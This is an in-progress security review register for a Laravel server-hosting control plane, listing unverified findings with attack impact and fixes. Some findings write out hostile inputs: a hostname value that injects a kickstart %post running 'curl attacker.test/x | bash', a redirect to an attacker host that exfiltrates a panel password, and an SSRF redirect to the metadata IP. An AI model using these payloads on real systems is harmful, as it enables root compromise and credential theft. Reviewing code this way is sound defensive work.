# Security review

Phase 9 of the build. Eight independent reviewers, one per dimension, each
reading the real code rather than the documentation, followed by an adversarial
verifier per dimension whose first instruction is to refute.

## Status

**In progress.** 5 of 8 dimensions have reported. Every finding below is
as filed by its reviewer and has **not yet been through verification**, so some of
them will turn out to be wrong. This file is the register, not the verdict; it is
rewritten with confirmations, refutations and fixes when the phase closes.

Reported so far: 6 high, 9 medium, 6 low.

### Why the demonstration tests are not committed

Each reviewer was allowed to write a test demonstrating its finding. Those tests
assert the behaviour as it is today, so they **pass against the unfixed code** and
will fail the moment the bug is fixed. Committing them would pin the vulnerable
behaviour into CI and invite somebody to "fix" the test instead of keeping the
fix. They are converted into ordinary regression tests, inverted, as each fix
lands. Where a finding has one, its path is named below.

---

## HIGH — Email verification is never sent and never enforced: User uses the MustVerifyEmail trait but does not implement the contract

**Dimension:** Authentication, sessions and account takeover  
**Location:** `apps/control-plane/src/Modules/Identity/Infrastructure/Models/User.php:33`

`User` declares `class User extends Authenticatable` with no `implements` clause. It picks up the `MustVerifyEmail` *trait* from `Illuminate\Foundation\Auth\User` but not the `Illuminate\Contracts\Auth\MustVerifyEmail` *contract*, and every framework enforcement point is an `instanceof` check against the contract. Result: registration never sends a verification mail, and the `verified` middleware guarding the entire /api/admin group waves unverified users straight through. The platform's claimed "one consistent gate" before ordering does not exist anywhere in the codebase.

**What it gets an attacker.** Register at POST /api/v1/register with any address you do not control — a competitor's, a real customer's, or a throwaway. The API answers 201 with `meta.email_verification_required: true`, no mail is ever sent, and nothing in the product ever checks `email_verified_at`. The account is immediately fully usable: sign in, place orders, provision servers, attach payment details. On a platform that runs real hardware and holds card data this is the fraud/chargeback path — every service is ordered by an account whose address was never proved, and the abuse-response playbook ("we emailed the address on file") reaches nobody. Separately, /api/admin is protected by `['auth:sanctum','verified']`; the `verified` half is inert, so any principal that reaches the admin prefix is one middleware short of what the route file claims.

**Proposed fix.** `class User extends Authenticatable implements MustVerifyEmail` (the contract, `Illuminate\Contracts\Auth\MustVerifyEmail`). Then add a test that asserts a `VerifyEmail` notification is actually sent on registration and that `verified` returns 403 for an unverified user, so the trait/contract split cannot silently regress.

**Demonstration.** `apps/control-plane/tests/Feature/Security/EmailVerificationNeverEnforcedTest.php` (not committed — see above)

---

## HIGH — The password confirmation that guards two-factor disable is unthrottled, uncounted and unlogged

**Dimension:** Authentication, sessions and account takeover  
**Location:** `apps/control-plane/src/Modules/Identity/Http/Controllers/TwoFactorController.php:97`

`requirePasswordConfirmation()` is the stated control that stops a hijacked session from removing the second factor ("A hijacked session must not be enough to disable the second factor"). It is a bare `Hash::check` on a route with no throttle middleware, no `registerFailedLogin()` call, and no `RecordLoginActivity` entry. The `api` middleware group is only `EnsureFrontendRequestsAreStateful` + `SubstituteBindings`, and `RateLimiter::for('api')` is defined in RateLimitServiceProvider but never applied to any route — verified with `php artisan route:list`.

**What it gets an attacker.** An attacker who has a session but not the password (stolen session cookie, shared/stolen device, a session lifted before the customer noticed) hammers `DELETE /api/v1/me/two-factor` with `current_password` guesses. There is no rate limit, the 5-attempt account lockout that guards /login is never invoked on this path, `failed_login_attempts` stays 0, `locked_until` stays null, and `GET /me/login-activity` — the page the customer would check — records nothing at all. 200 wrong guesses in the demonstration produced 200 plain 422s and left the account pristine. When a guess lands, the second factor is removed outright, converting a time-limited session theft into a permanent takeover of an account that controls BMC power/virtual-media and stored payment details. `PUT /me/password` has the same shape, so the same oracle works there too.

**Proposed fix.** Route the password-confirmation endpoints through a limiter keyed on the authenticated user id, call `$user->registerFailedLogin()` on a failed confirmation so the existing lockout applies, and record a `RecordLoginActivity` row so the failed attempts appear on the customer's login-activity page. Applying `throttle:api` to the authenticated group would also close the wider gap.

**Demonstration.** `apps/control-plane/tests/Feature/Security/PasswordConfirmationIsUnthrottledTest.php` (not committed — see above)

---

## HIGH — BMC password survives in the exception `previous` chain and is written verbatim by the structured log channel that ships to Loki

**Dimension:** Secret handling, logging and data exposure  
**Location:** `apps/control-plane/src/Modules/Dedicated/Infrastructure/Providers/IpmiDedicatedProvider.php:330`

IpmiDedicatedProvider builds a redacted command string for its own message and context — and then attaches the raw transport exception as `previous`, whose message is the full ipmitool argv including `-P <password>`; RedactSecretsProcessor cannot reach it because it only rewrites strings and arrays, never a Throwable in the log context, so Monolog's JsonFormatter serialises the chain and the plaintext BMC root password lands in storage/logs/lynomia.json.

**What it gets an attacker.** Any code path that reports one of these exceptions the way Laravel's own reporter does — `log(..., ['exception' => $e])` — writes the credential. Concretely: a `report()` of an uncaught DedicatedProviderException (SyncHardwareInventory::execute re-throws it by documented contract, `@throws DedicatedProviderException`, and nothing above it catches), a queue failure (`failed_jobs.exception` stores `(string) $e`, which PHP renders with the whole previous chain), or Horizon's failed-job view. Grafana Alloy tails lynomia.json and pushes it to Loki (infrastructure/monitoring/alloy/config.alloy), so the credential becomes readable by everyone with Grafana access and sits in Loki's chunks for the retention period. A BMC/IPMI credential is power control and virtual media on a physical host — an attacker with it can power-cycle or netboot-reinstall a customer's dedicated server, and read its disks by booting their own image. Reachability caveat, stated honestly: config/dedicated.php ships no `credentials` map (config('dedicated.credentials.<ref>') is always []), so today DedicatedProviderFactory refuses to build a real connection and no real password exists to leak. The leak is deterministic the moment the secret store is wired, which is what .env.example promises ("configured per-server in the infrastructure inventory"). The same `previous: $e` pattern is at ProxmoxComputeProvider.php:601/613, CpanelHostingProvider.php:415/431/442, DirectAdminHostingProvider.php:398/414/422 and RedfishDedicatedProvider.php:722/732; those attach Guzzle ConnectionExceptions whose messages do not quote headers, so IPMI is the severe case because argv is the only place ipmitool takes a password.

**Proposed fix.** Do not pass the transport exception as `previous` when its message can quote a credential — or, better, make the control global: give RedactSecretsProcessor a branch for Throwable values in the context that replaces them with an already-scrubbed structure (class, redacted message, file, redacted previous chain), so the promise that redaction is a processor rather than a call-site convention actually holds for the one object that carries the most secrets.

**Demonstration.** `apps/control-plane/tests/Feature/Security/BmcPasswordLeaksThroughExceptionChainTest.php` (not committed — see above)

---

## HIGH — Secret redaction is opt-in per log channel, and the channel the stack config defaults to has no processor

**Dimension:** Secret handling, logging and data exposure  
**Location:** `apps/control-plane/config/logging.php:73`

RedactSecretsProcessor is attached by StructuredLogger, which builds exactly one of the eleven configured channels. `'stack' => ['channels' => explode(',', env('LOG_STACK', 'single'))]` means a deployment that does not set LOG_STACK logs through `single`, which writes whatever it is handed — including keys that are literally in config('security.redacted_keys').

**What it gets an attacker.** Nothing in the application enforces the channel: ProviderRegistryServiceProvider refuses to boot production with fake providers, but there is no equivalent check for the log channel, and the Ansible control_plane role templates no environment file at all (its only template is horizon.service.j2), so the production .env is supplied out of band. A deployment that sets LOG_CHANNEL but forgets LOG_STACK — or sets LOG_STACK=daily, or LOG_CHANNEL=stderr for a container — silently loses redaction entirely, and there is no signal: the log looks normal, it just has credentials in it. Every existing Log::warning/Log::error call site in the codebase writes to the default channel. This is the invariant "redaction is a Monolog processor, not a call-site convention" failing open rather than closed.

**Proposed fix.** Attach the processor globally rather than per channel — push it from a service provider onto every resolved Monolog logger (Log::extend / $this->app['log']->extend, or a `tap` on each channel) — and add a production readiness assertion that the resolved default channel carries it, in the same place ProviderRegistryServiceProvider refuses fake providers.

**Demonstration.** `apps/control-plane/tests/Feature/Security/RedactionIsOptInPerLogChannelTest.php` (not committed — see above)

---

## HIGH — Every provider adapter follows HTTP redirects to any host the device names — SSRF, and on 307/308 the request body (a customer's plaintext panel password) is re-POSTed off-host

**Dimension:** Injection, deserialisation and untrusted input  
**Location:** `src/Modules/Dedicated/Infrastructure/Providers/RedfishDedicatedProvider.php:738`

None of the four real provider adapters (Redfish, Proxmox, cPanel/WHM, DirectAdmin) disables redirect following, so Guzzle's default allow_redirects (max 5, protocols http+https) applies: a managed device can point any request the platform makes at an arbitrary host, and for a 307/308 Guzzle preserves the method and the body — which for DirectAdmin CMD_API_USER_PASSWD / CMD_API_ACCOUNT_USER and WHM createacct contains the customer's plaintext panel password.

**What it gets an attacker.** An attacker who controls what a managed device answers — a compromised BMC or cPanel/DirectAdmin node, a reseller-operated node, a MITM against any row with verify_tls=false, or DNS control over a node hostname — answers the platform's request with 302/307 and a Location of their choosing. (1) SSRF: `302 Location: http://169.254.169.254/latest/meta-data/...` makes the queue worker — which sits on the management network — fetch an arbitrary internal URL, and the body it finds is JSON-decoded and used as inventory. This completely bypasses RedfishDedicatedProvider::resolveLink(), the off-host @odata.id check the class documents as its whole SSRF mitigation, because the URL never becomes a link in a body. (2) Credential exfiltration: `307 Location: https://collector.attacker.test/collect` on a change-password or create-account call re-POSTs the form body, so `passwd=<plaintext>` lands on the attacker's host. Guzzle does strip Authorization cross-origin, so the platform's own login key / BMC Basic / PVEAPIToken is not leaked — the body is. The adapter then reports an ordinary provider failure and the operator sees nothing unusual.

**Proposed fix.** Add ->withOptions(['allow_redirects' => false]) (or ->withoutRedirecting()) to request() in all four adapters, and treat a 3xx as an unexpected response. A Redfish/Proxmox/WHM/DirectAdmin endpoint has no legitimate reason to redirect; if one must be tolerated, resolve the Location through the same same-host check resolveLink() already implements before re-issuing.

**Demonstration.** `apps/control-plane/tests/Feature/Security/ProviderAdaptersFollowRedirectsOffHostTest.php and apps/control-plane/tests/Feature/Security/HostingNodeRedirectExfiltratesPanelPasswordTest.php` (not committed — see above)

---

## HIGH — PaymentCaptured is dispatched inside the webhook's open transaction, so a queue worker can find the capture missing and silently abandon settlement

**Dimension:** Payment integrity, webhooks and money movement  
**Location:** `apps/control-plane/src/Modules/Payments/Application/Actions/RecordPaymentCapture.php:87`

The event that drives invoice settlement and fulfilment is pushed to the queue while the capture row is still uncommitted, and the listener that finds it missing logs a warning and returns rather than retrying — so a captured payment can end with no service and no recovery path.

**What it gets an attacker.** Not attacker-driven; it is a load-triggered loss. Redis (production QUEUE_CONNECTION per .env.example) shares no transaction with PostgreSQL and every connection in config/queue.php sets 'after_commit' => false, so the SettleInvoiceOnPaymentCaptured job is runnable the instant event() is called — which happens inside IngestWebhookEvent's DB::transaction (line 104). A worker that dequeues before the webhook's transaction commits gets null from Transaction::find(), hits the `if ($invoice === null || $transaction === null)` branch (SettleInvoiceOnPaymentCaptured.php:71), logs 'Captured payment refers to a row that no longer exists' and returns without throwing — deliberately, so the job is never retried. The webhook has already answered 200 and webhook_events.status is 'processed', so no provider redelivery re-runs it either. Net effect: the customer's card is charged, the invoice stays Open, the order stays pending_payment, no subscription is started, no server is provisioned, and nothing anywhere retries. The window widens exactly when the database is slow — the same condition that makes providers redeliver.

**Proposed fix.** Dispatch PaymentCaptured through DB::afterCommit(), the way SettleInvoice already dispatches InvoicePaid — or set 'after_commit' => true on the queue connections. Independently, make the listener's missing-row branch throw (or requeue with backoff) instead of returning: a capture that cannot be found is either a race or data loss, and both need a retry rather than a log line.

**Demonstration.** `apps/control-plane/tests/Feature/Security/PaymentCapturedIsDispatchedBeforeTheCaptureCommitsTest.php` (not committed — see above)

---

## MEDIUM — No authenticated /api/v1 route is rate limited; the `api` limiter and every per-token ceiling are dead code

**Dimension:** Authorisation boundaries and multi-tenancy isolation  
**Location:** `apps/control-plane/bootstrap/app.php:27`

RateLimitServiceProvider defines an `api` limiter that honours PersonalAccessToken::$rate_limit_per_minute and config('security.rate_limits.api_token'), and a `provisioning` limiter — but no route, group, or middleware alias ever references `throttle:api` or `throttle:provisioning`, so every authenticated customer API endpoint (including the ones that verify the account password) accepts unlimited requests.

**What it gets an attacker.** An attacker who obtains a session cookie (XSS, a shared machine, a stolen laptop) or a leaked API token has an unlimited, un-logged password oracle: DELETE /api/v1/me/two-factor and POST /api/v1/me/two-factor both check `current_password` via Hash::check and answer 422 on a miss. Neither is throttled and neither increments failed_login_attempts or triggers the lockout, so the account password can be brute-forced at full network speed — after which the attacker turns off the second factor and owns the account. The same gap means a leaked API token can be used to scrape /api/v1 at any rate; the per-token ceiling the ApiKeys model advertises never applies.

**Proposed fix.** Attach the limiter to the group that already exists: `Route::middleware(['api','throttle:api'])->prefix('api/v1')` (and the admin prefix), or pass `apiPrefix`/`api:` to withRouting so Laravel wires `throttle:api` itself. Separately, count a failed `current_password` confirmation towards User::registerFailedLogin() so the lockout covers it.

**Demonstration.** `apps/control-plane/tests/Feature/Security/UnthrottledAuthenticatedApiTest.php` (not committed — see above)

---

## MEDIUM — The API token's customer scope, IP allow-list, and the admin API's "platform guard" are documented but implemented by nothing

**Dimension:** Authorisation boundaries and multi-tenancy isolation  
**Location:** `apps/control-plane/src/Modules/ApiKeys/Infrastructure/Models/PersonalAccessToken.php:20`

PersonalAccessToken documents that customer_id exists "so a token belonging to a user who is a member of several accounts can never act outside the one it was issued for" and carries a CIDR allow-list; routes/api_admin.php states that admin capability "can never be reached by a customer token that happens to be over-scoped: every route here requires the platform guard and an explicit permission". Neither statement is true of any code: nothing reads $token->customer_id or $token->allowed_ip_ranges, there is no platform guard (config/auth.php defines only 'web'), and the admin group declares only ['auth:sanctum','verified'] with no ability or permission requirement.

**What it gets an attacker.** Not exploitable today because the only implemented endpoints are the Identity ones — but the enforcement point does not exist anywhere, so the first controller merged inherits none of it. A token issued for customer A used by a user who also belongs to customer B will act on B the moment a customer-scoped endpoint exists, because the scope is only a column. And the first route added inside the api_admin group is reachable by any verified customer's session cookie or personal access token (default abilities ['*'], no tokenCan anywhere in the codebase), since 'auth:sanctum' is the same guard the customer API uses — the group comment's promise is enforced only by whoever remembers to add `permission:` per route.

**Proposed fix.** Make the scope structural rather than documentary: a middleware on the /api/v1 group that resolves the acting customer from $user->currentAccessToken()->customer_id (falling back to the session's selected customer), rejects when the token names a customer the user is not an accepted member of, and enforces allowed_ip_ranges; and put `permission:` (or a dedicated staff guard/ability) on the api_admin group itself rather than trusting each future route to add one.

---

## MEDIUM — Auth rate-limiter key permits unlimited password spraying and unlimited enumeration from a single host

**Dimension:** Authentication, sessions and account takeover  
**Location:** `apps/control-plane/src/Providers/RateLimitServiceProvider.php:76`

`defineAuthLimiter` keys every auth limiter on `email|ip` and its comment claims this bounds both attack shapes: "keying on IP alone would let a single host spray many addresses. Requiring both to match bounds each attack without enabling the other." The second half is false. Because the address is part of the key, every new address is a fresh bucket, so one host gets 5 attempts per address per minute against an unbounded number of addresses. No per-IP ceiling exists behind it — the `api` group carries no throttle at all.

**What it gets an attacker.** From one host, POST /api/v1/login once per address across a leaked-credential list or a customer-address list. 60 distinct addresses in one minute produced zero 429s in the demonstration; the shape scales linearly with no ceiling. A successful guess is trivially distinguishable (200 with the user payload, or 403 `auth.two_factor_required`) so the spray self-reports its hits. The same key shape is used for `register` and `password-reset`, so the same host also gets an unthrottled enumeration harness (see the enumeration finding): one pass over an address list classifies every address, a second pass sprays a common password at the ones that exist. On a hosting platform the payoff per hit is a customer's servers and stored card.

**Proposed fix.** Return two limits from each auth limiter, as `RateLimiter::for` supports: the existing `email|ip` bucket plus a coarser per-IP bucket (e.g. 20/min across all addresses) — and ideally a per-address-only bucket with a longer decay to bound distributed guessing against one known customer.

**Demonstration.** `apps/control-plane/tests/Feature/Security/LoginThrottleAllowsPasswordSprayingTest.php` (not committed — see above)

---

## MEDIUM — Account enumeration through the lockout status code, inside the throttle budget

**Dimension:** Authentication, sessions and account takeover  
**Location:** `apps/control-plane/src/Modules/Identity/Application/Actions/AttemptLogin.php:62`

AttemptLogin goes to real trouble to make an unknown address indistinguishable from a wrong password — identical message, identical 422 `auth.invalid_credentials`, a dummy `Hash::make()` to equalise timing — and then the lockout counter gives the answer away. Only a real account can be locked, and a locked account answers 423 `auth.account_locked` with a `locked_until` timestamp. Five requests per address, exactly the `throttle:login` budget of 5/minute, classify any address with certainty. Registration is a one-request oracle on top of that.

**What it gets an attacker.** For each address in a list, send 5 login attempts with junk passwords from one host (see the spraying finding — the per-address key means the list length is unbounded). An address that exists answers 423 `auth.account_locked` on the fifth; one that does not answers 422 `auth.invalid_credentials` every time. No timing measurement is needed — the status code and error code differ. One request to POST /api/v1/register gives the same answer even faster: `Rule::unique('users','email')` returns 422 with an `email` field error for a known address and 201 for an unknown one. The output is a confirmed customer list for a hosting provider, which is directly monetisable as a phishing and support-social-engineering target list, and it is the input to the spraying attack above. The probe also leaves the victim locked out for 15 minutes, so it doubles as a targeted denial of login.

**Proposed fix.** Return the same 422 `auth.invalid_credentials` for a locked account as for a wrong password (keep the 423 only once the correct password has been presented, or drop it entirely and rely on the limiter). For registration, accept the request and send a "someone tried to register with your address" mail to the existing account instead of returning a unique-constraint failure.

**Demonstration.** `apps/control-plane/tests/Feature/Security/AccountEnumerationTest.php` (not committed — see above)

---

## MEDIUM — Revoking sessions does not revoke a remember-me device; remember_token is never rotated on that path

**Dimension:** Authentication, sessions and account takeover  
**Location:** `apps/control-plane/src/Modules/Identity/Http/Controllers/SessionController.php:60`

`DELETE /me/sessions` ("sign out of all other sessions") and `DELETE /me/sessions/{id}` ("revoke this session") delete rows from the `sessions` table and nothing else. A device holding a remember-me cookie is not a session row — the cookie is a standalone credential `id|remember_token|password-hash` that `SessionGuard::userFromRecaller()` re-authenticates and from which it creates a brand-new session on the very next request. `remember_token` is rotated on logout and on password *reset* but on neither revocation endpoint, so the control a customer reaches for the moment they see an unfamiliar session does not evict it.

**What it gets an attacker.** An attacker exfiltrates the victim's `remember_web_*` cookie (shared machine, malware, a backup, a proxy). The victim opens GET /me/sessions, sees a session they do not recognise, and clicks "sign out all other devices". Every session row is deleted, and `remember_token` is left untouched. The attacker's next request presents only the stolen cookie, is authenticated via remember, and a fresh session is minted — demonstrated end-to-end: after `DELETE /me/sessions` and `DB::table('sessions')->delete()`, replaying the recaller cookie against `GET /api/v1/me` returns 200 with the victim's identity. The victim has performed the remediation the product offers and remains compromised, and will now believe the intruder is gone. (A password change *does* evict it, because SessionGuard compares the password hash baked into the recaller — but that is framework behaviour the application does not rely on, and it is not the control the session page presents.)

**Proposed fix.** Have `destroyOthers()` (and `ProfileController::updatePassword`) call `Auth::guard('web')->logoutOtherDevices($password)` or simply `$user->forceFill(['remember_token' => Str::random(60)])->save()` alongside the session deletion, exactly as PasswordResetController already does. Also surface remember-me devices in GET /me/sessions, or the list is incomplete by construction.

**Demonstration.** `apps/control-plane/tests/Feature/Security/RevokingSessionsDoesNotRevokeRememberMeTest.php` (not committed — see above)

---

## MEDIUM — SecretRedactor's pattern list covers a Proxmox credential shape the platform never produces and misses the two it produces on every request

**Dimension:** Secret handling, logging and data exposure  
**Location:** `apps/control-plane/src/Modules/Shared/Infrastructure/Logging/SecretRedactor.php:35`

The Proxmox pattern `/\bPVE(?:API)?[A-Za-z]*:[^\s"\']+/` requires a colon, so it matches tickets and CSRF tokens — which ProxmoxConnection states outright the platform never creates ("There is deliberately no code path here that logs in") — and does not match `PVEAPIToken=<id>=<secret>`, the header on every Proxmox request. WHM's `whm <user>:<token>` matches nothing either: it has no Bearer/Basic/Token scheme word and no word boundary before a `token=` form.

**What it gets an attacker.** The pattern rules exist specifically for "places a key-based rule can never reach" — a credential quoted inside a provider's free-text error. Today the hole is contained only because ProxmoxComputeProvider::scrub() and CpanelHostingProvider::scrub() str_replace their own connection's values before handing anything on; that is exactly the call-site convention the pattern list is supposed to back up. Every consumer that redacts without an adapter's help has only this net: RunProvisioningJob::redactMessage (the single choke point for every failure message persisted to provisioning_jobs.last_error and provisioning_attempts.error_message), IngestWebhookEvent::recordFailureOn, RedactsProviderPayloads/RedactsJsonSecrets on the jsonb columns, DetectStaleJobs, SyncClusterInventory. A future adapter, a handler that returns a classified failure carrying a raw header, or a config dump puts a Proxmox API token — full control of every customer VM on the cluster — or a WHM root token — every customer site, database and mailbox on the node — into a plain-text support-readable column with nothing stopping it.

**Proposed fix.** Replace the ticket-only rule with one that covers what the adapters actually send: `/\bPVEAPIToken=[^\s"']+/` and `/\bwhm\s+[^\s:]+:[A-Za-z0-9]{8,}/i`, keeping the ticket pattern for completeness. Add each new provider's header shape to VALUE_PATTERNS as part of writing the adapter, and assert it in SecretRedactorTest against the connection object's own authorizationHeader() rather than against a hand-written string.

**Demonstration.** `apps/control-plane/tests/Feature/Security/RedactorMissesProviderTokenShapesTest.php` (not committed — see above)

---

## MEDIUM — install_variables from the provisioning job payload is spread verbatim into the PXE answer file, overriding the platform's own IPAM allocation and able to inject installer directives

**Dimension:** Injection, deserialisation and untrusted input  
**Location:** `src/Modules/Dedicated/Application/Handlers/ProvisionDedicatedHandler.php:167`

profileVariables() takes `install_variables` out of the job payload, filters only on is_scalar, and spreads it AFTER the platform's computed keys, so a payload key wins over hostname / ipv4_address / ipv4_prefix_length / ipv4_gateway; and InstallProfileRenderer substitutes values into the answer file verbatim, so a value containing a newline writes new installer directives.

**What it gets an attacker.** Anything that can influence a CreateDedicated job payload (today only internal code and operators — no HTTP route creates provisioning jobs yet, so this is latent, not live) gets two things. First, `install_variables: {ipv4_address: <someone else's address>}` overrides the address IpAllocator reserved; the machine is installed with that address while the platform commits and bills the original one — an address conflict or a silent hijack of another tenant's IP. Second, any variable value may carry newlines, so `hostname: "ded-01\n%post --interpreter=/bin/bash\ncurl attacker.test/x | bash\n%end"` adds a %post block to a kickstart: root command execution on a physical host during install, before the customer ever logs in. The rendered file is what the boot server serves to a machine that has just been authorised to erase its disks.

**Proposed fix.** Spread the payload variables FIRST so platform-computed values always win (or reject a payload key that collides with one). Constrain the values the renderer will substitute — an allowlist of keys declared on the profile, plus a per-value character rule that refuses CR/LF and whatever else the target installer treats as a directive separator — and fail the render rather than emitting the file.

**Demonstration.** `apps/control-plane/tests/Feature/Security/InstallProfileVariablesInjectAnswerFileDirectivesTest.php` (not committed — see above)

---

## MEDIUM — A single-use coupon's discount can be granted any number of times; only the redemption counter is protected

**Dimension:** Payment integrity, webhooks and money movement  
**Location:** `apps/control-plane/src/Modules/Orders/Application/Actions/PlaceOrder.php:346`

PlaceOrder validates a coupon without a lock and writes the discount onto the order, while redemption is deferred to FulfilOrderOnInvoicePaid, which swallows every redemption failure — so max_redemptions and max_redemptions_per_customer bound the counter but not the money.

**What it gets an attacker.** A customer with a code limited to one use per customer places two (or fifty) orders before paying any of them. Every checkout re-reads redemption_count = 0 and passes CouponValidator, so every order is written with the discount and every invoice is issued at the discounted total. When each invoice is paid, FulfilOrderOnInvoicePaid marks the order paid, then calls RedeemCoupon inside a try/catch: the first succeeds, every later one throws CouponFullyRedeemedException / CouponCustomerLimitReachedException and is caught and logged. The order is still fulfilled and the subscription still started — the catch is after the transition and before the subscription loop deliberately, so the customer keeps the service. The books show redemption_count = 1 and one coupon_redemptions row while N discounts were given away. No threads or millisecond race needed: the window is the whole interval between checkout and payment. A widely shared 'first 100 customers' code is spent as many times as people can check out in that window.

**Proposed fix.** Consume the coupon where the discount is granted, not after payment: reserve it under the coupon row lock during PlaceOrder (releasing the reservation when the order is cancelled or expires), or re-validate under the lock at invoice issue and re-price the order without the discount if the coupon no longer has capacity. If the deferred model is kept, a failed redemption must void the discount on the unpaid invoice rather than be logged.

**Demonstration.** `apps/control-plane/tests/Feature/Security/CouponDiscountGrantedBeyondRedemptionLimitTest.php` (not committed — see above)

---

## MEDIUM — An invoice is settled by summing charges in other currencies as if they were its own minor units

**Dimension:** Payment integrity, webhooks and money movement  
**Location:** `apps/control-plane/src/Modules/Billing/Application/Actions/SettleInvoice.php:111`

SettleInvoice guards the single capture it is handed (currency, customer, kind, status) and then adds it to a SUM over every other charge attached to the invoice that filters on neither currency nor customer, so 30000 US cents and 30000 Kuwaiti fils are added together as the integer 30000.

**What it gets an attacker.** Any charge row attached to the invoice with kind=charge and status=succeeded is counted at face value in minor units. RecordPaymentCapture creates exactly such rows and copies invoice_id straight out of the payment metadata with no comparison of the payment's currency (or its customer) against the invoice named there. Once one foreign-currency charge is attached — a customer billed in USD whose intent metadata names a KWD invoice, a mis-set metadata field, a manual reconciliation row — a subsequent one-fils capture in the invoice's own currency passes assertSettleable and the recomputation applies min(1 + 30000, 30000) = 30000: a 30.000 KWD invoice is marked Paid, amount_due drops to zero, InvoicePaid fires, the order fulfils and the service is provisioned. This directly breaks invariant 1 ('never converted between currencies') — treating cents as fils is a ~3x implicit conversion in the customer's favour. Not reachable from today's HTTP surface because intent creation is not yet wired to a route; it becomes reachable the moment checkout can choose a payment currency.

**Proposed fix.** Add `->where('currency', $locked->currency)` and `->where('customer_id', $locked->customer_id)` to the otherCharges sum, and refuse to attach a capture to an invoice whose currency or customer does not match at the point RecordPaymentCapture writes invoice_id, rather than only when SettleInvoice later reads it.

**Demonstration.** `apps/control-plane/tests/Feature/Security/InvoiceSettlesOnForeignCurrencyChargesTest.php` (not committed — see above)

---

## LOW — An invited-but-never-accepted customer member already holds the full role

**Dimension:** Authorisation boundaries and multi-tenancy isolation  
**Location:** `apps/control-plane/src/Modules/Identity/Infrastructure/Models/User.php:155`

User::roleWithin() returns the membership's role without consulting accepted_at, and both User::customers() and Customer::users() load unaccepted memberships. CustomerMember::isAccepted() exists and is called by nothing in the application.

**What it gets an attacker.** Once an invite flow lands, inviting an address is enough to grant it: the invitee authenticates and is an Administrator of the account before clicking anything, so a mistyped or attacker-supplied invite address is immediate access rather than a pending offer, and an invite that is retracted before acceptance still confers the role until the row is deleted. Today it is already observable that GET /api/v1/me serialises the target customer's display_name, legal_name, currency and country to a user who never accepted the invitation.

**Proposed fix.** Filter acceptance in the relations (`->wherePivotNotNull('accepted_at')`, with a separate `pendingInvitations()` relation for the invite screen) and make roleWithin() return null for a membership where isAccepted() is false, so acceptance is a precondition of the role rather than a column somebody has to remember to check.

**Demonstration.** `apps/control-plane/tests/Feature/Security/UnacceptedMembershipGrantsAccessTest.php` (not committed — see above)

---

## LOW — The two-factor rate limiter key is always empty: `$request->input('email')` does not exist on that endpoint

**Dimension:** Authentication, sessions and account takeover  
**Location:** `apps/control-plane/src/Providers/RateLimitServiceProvider.php:74`

`defineAuthLimiter('two-factor', 'two_factor')` builds its key from `$request->input('email')`, but `POST /api/v1/login/two-factor` validates and receives only `challenge_token` and `code` — there is no `email` field on that request. The key therefore degenerates to the constant string `'|'.$ip`: a single shared 5-per-minute bucket per source address covering every user's second-factor submissions.

**What it gets an attacker.** This is not a brute-force weakening — the challenge token is consumed on redemption and a wrong code calls `registerFailedLogin()`, so guessing the six digits still costs a full password login per attempt and locks the account after five. The reachable effect is availability: anyone behind a shared egress address (an office NAT, a mobile carrier CGNAT, a corporate VPN) can exhaust the shared bucket with five junk submissions per minute and stop every other user on that address from completing sign-in. It also means the provider's own stated design — "Authentication limiters key on address *and* source IP together" — is not what runs on this endpoint, so the limiter will not behave as documented if the endpoint is ever changed.

**Proposed fix.** Key the two-factor limiter on the challenge token's hash (or resolve the user from the challenge before limiting) plus the IP, so one user's failures cannot consume another's budget and a shared egress address cannot be used to block sign-in for everyone behind it.

---

## LOW — Forgot-password endpoint leaks account existence through a synchronous SMTP round trip

**Dimension:** Authentication, sessions and account takeover  
**Location:** `apps/control-plane/src/Modules/Identity/Http/Controllers/PasswordResetController.php:26`

`sendLink()` deliberately returns 202 whatever the outcome, to avoid an enumeration oracle. But `ResetPassword` is not a `ShouldQueue` notification and `MAIL_MAILER=smtp`, so the mail transmission happens inside the request. A known address costs a token insert plus a full SMTP transaction; an unknown address returns from `Password::sendResetLink` with `INVALID_USER` immediately, having touched neither. The status code is constant, the wall-clock time is not.

**What it gets an attacker.** Time POST /api/v1/password/forgot per address. The difference is an SMTP connect/EHLO/MAIL/RCPT/DATA/QUIT round trip against MAIL_HOST versus nothing — tens to hundreds of milliseconds, far above network jitter and requiring no statistics to separate. This endpoint's per-address throttle is 3 per 10 minutes, but because the limiter key includes the address (see the spraying finding) a single host can walk an unlimited number of addresses. Second-order to the lockout oracle, which needs no measurement at all, but it defeats the specific defence this controller's comment claims to provide.

**Proposed fix.** Make the reset notification queued (`ShouldQueue`) so the request cost is identical either way, or pad the handler to a fixed floor duration. Queuing is preferable: it also stops an SMTP outage from turning into 5xx on a public endpoint.

---

## LOW — Panel-supplied SSO URL is handed back to the customer verbatim

**Dimension:** Injection, deserialisation and untrusted input  
**Location:** `src/Modules/SharedHosting/Infrastructure/Providers/CpanelHostingProvider.php:359`

createSsoSession() takes the `url` field straight out of the panel's JSON/urlencoded response and returns it as SsoSession::url with no check that it points at the node the platform asked, and no scheme check.

**What it gets an attacker.** A compromised or reseller-operated hosting node answers create_user_session / CMD_API_LOGIN_KEYS with `url: https://cpanel-login.attacker.test/...`. The customer clicks "open control panel" in the portal and is delivered to an attacker-controlled login page that looks exactly like their panel. Requires a hostile node, and no HTTP route exposes SSO yet, so the reach is small today — but the value is trusted at the moment it is stored, which is the wrong moment to leave it unchecked.

**Proposed fix.** Validate the returned URL the way RedfishDedicatedProvider::resolveLink() validates a link: parse it and require https plus a host and port equal to the node's own endpoint, and refuse loudly otherwise.

---

## LOW — SecretRedactor silently skips a redaction pattern when PCRE aborts, and its PEM pattern is quadratic

**Dimension:** Injection, deserialisation and untrusted input  
**Location:** `src/Modules/Shared/Infrastructure/Logging/SecretRedactor.php:99`

redactString() ignores a null return from preg_replace, which is exactly what PCRE returns when the backtrack limit is exhausted — so on a large enough input a pattern silently does not run, and the value it was meant to mask passes through unredacted.

**What it gets an attacker.** Reachable only from a hostile managed device, and mostly self-defeating (the device would have to supply both the oversized string and the secret it wants unmasked), so I am reporting it as a robustness defect rather than a live exploit. It matters because the failure is silent by construction: the whole class exists so redaction is not a call-site convention, and this is a path where redaction quietly does not happen. Measured: the PEM pattern's `.*?` scans to end-of-string from every `-----BEGIN` start position, so a 1.2 MB string of repeated `-----BEGIN A PRIVATE KEY-----` with no END exhausts pcre.backtrack_limit; preg_replace returns null and the pattern is dropped for that value. DirectAdminHostingProvider parses a node's whole response body with parse_str and passes the result to redact() without truncation, so a node can choose the size.

